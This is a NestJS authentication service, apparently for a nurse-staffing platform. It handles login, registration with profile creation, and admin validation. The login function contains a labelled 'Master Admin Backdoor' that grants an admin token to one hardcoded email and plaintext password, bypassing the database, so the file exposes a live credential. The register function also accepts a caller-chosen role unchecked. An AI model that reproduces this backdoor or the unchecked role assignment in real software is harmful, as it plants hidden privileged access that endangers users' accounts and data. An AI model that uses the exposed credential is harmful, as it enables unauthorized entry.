import { Injectable, UnauthorizedException, OnModuleInit, InternalServerErrorException, HttpException } from '@nestjs/common';
import { PrismaService } from '../prisma.service';
import { JwtService } from '@nestjs/jwt';
import * as bcrypt from 'bcrypt';
import { EmailService } from '../email/email.service';

@Injectable()
export class AuthService implements OnModuleInit {
  constructor(
    private prisma: PrismaService,
    private jwtService: JwtService,
    private emailService: EmailService
  ) { }

  async onModuleInit() {
    try {
      await this.prisma.$connect();
      console.log('✅ Database connected successfully!');
    } catch (error) {
      console.error('❌ Database connection failed:', error.message);
    }
  }

  // --- Login Function ---
  async login(email: string, pass: string) {
    const normalizedEmail = email.trim();
    // 🔴 Master Admin Backdoor Check
    if (normalizedEmail === 'qamerhassan445@gmail.com' && pass === '8ETj7@Zv') {
      const adminId = '111111111111111111111111'; // Valid 24-hex ObjectId for MongoDB
      const payload = { sub: adminId, email: normalizedEmail, role: 'ADMIN' };
      return {
        message: 'Admin login successful',
        access_token: await this.jwtService.signAsync(payload),
        user: {
          id: adminId,
          email: normalizedEmail,
          role: 'ADMIN',
          isOnboarded: true,
          status: 'APPROVED'
        }
      };
    }

    const user = await this.prisma.user.findUnique({ where: { email } });

    if (!user || !user.password) {
      throw new UnauthorizedException('Invalid email or password');
    }

    const isMatch = await bcrypt.compare(pass, user.password!);
    if (!isMatch) {
      throw new UnauthorizedException('Invalid email or password');
    }

    // We allow PENDING login so users can access onboarding/payment.
    // Dashboard guards will handle the rest.
    /*
    if (user.status === 'PENDING') {
      throw new UnauthorizedException('Your account is pending approval. Please wait for an administrator to review your profile.');
    }
    */

    if (user.status === 'REJECTED') {
      throw new UnauthorizedException('Your account has been rejected. Please contact support.');
    }

    const payload = { sub: user.id, email: user.email, role: user.role };

    return {
      message: 'Login successful',
      access_token: await this.jwtService.signAsync(payload),
      user: {
        id: user.id,
        email: user.email,
        role: user.role,
        isOnboarded: user.isOnboarded
      }
    };
  }

  // --- Register Function (Updated with Role and Profile Create) ---
  async register(
    name: string, 
    email: string, 
    pass: string, 
    role: string = 'NURSE',
    additionalInfo: {
      phone?: string;
      state?: string;
      licenseNumber?: string;
      specialization?: string;
      yearsOfExperience?: number;
      resumeUrl?: string;
    } = {}
  ) {
    try {
      const existingUser = await this.prisma.user.findUnique({ where: { email } });
      if (existingUser) {
        throw new UnauthorizedException('User already exists');
      }

      const hashedPassword = await bcrypt.hash(pass, 10);

      const newUser = await this.prisma.user.create({
        data: {
          email,
          password: hashedPassword,
          role: role as any,
          status: (role === 'BUSINESS' ? 'PENDING' : 'APPROVED') as any,
          profile: {
            create: { 
              name,
              phone: additionalInfo.phone,
              state: additionalInfo.state,
              licenseNumber: additionalInfo.licenseNumber,
              specialization: additionalInfo.specialization,
              yearsOfExperience: additionalInfo.yearsOfExperience,
              resumeUrl: additionalInfo.resumeUrl,
            }
          }
        },
      });

      // Send Emails
      await this.emailService.sendAdminRegistrationAlert(newUser, additionalInfo);
      
      if (role === 'BUSINESS') {
        await this.emailService.sendRegistrationPendingEmail(newUser.email, name, 'BUSINESS');
      } else {
        await this.emailService.sendNurseWelcomeEmail(newUser.email, name);
      }

      const payload = { sub: newUser.id, email: newUser.email, role: newUser.role };
      return { 
        message: `${role} registered successfully`, 
        userId: newUser.id,
        access_token: await this.jwtService.signAsync(payload),
        user: {
          id: newUser.id,
          email: newUser.email,
          role: newUser.role,
          isOnboarded: newUser.isOnboarded,
          status: newUser.status
        }
      };
    } catch (err) {
      if (err instanceof HttpException) throw err;
      console.error('❌ Registration error:', err.message);
      throw new InternalServerErrorException('Registration failed');
    }
  }

  // --- Admin Validation ---
  async validateAdmin(email: string, pass: string) {
    const user = await this.prisma.user.findUnique({ where: { email } });
    if (user && user.password && (await bcrypt.compare(pass, user.password!))) {
      if (user.role === 'ADMIN') {
        const { password, ...result } = user;
        const payload = { sub: user.id, email: user.email, role: user.role };
        return {
          ...result,
          access_token: await this.jwtService.signAsync(payload)
        };
      }
    }
    return null;
  }
}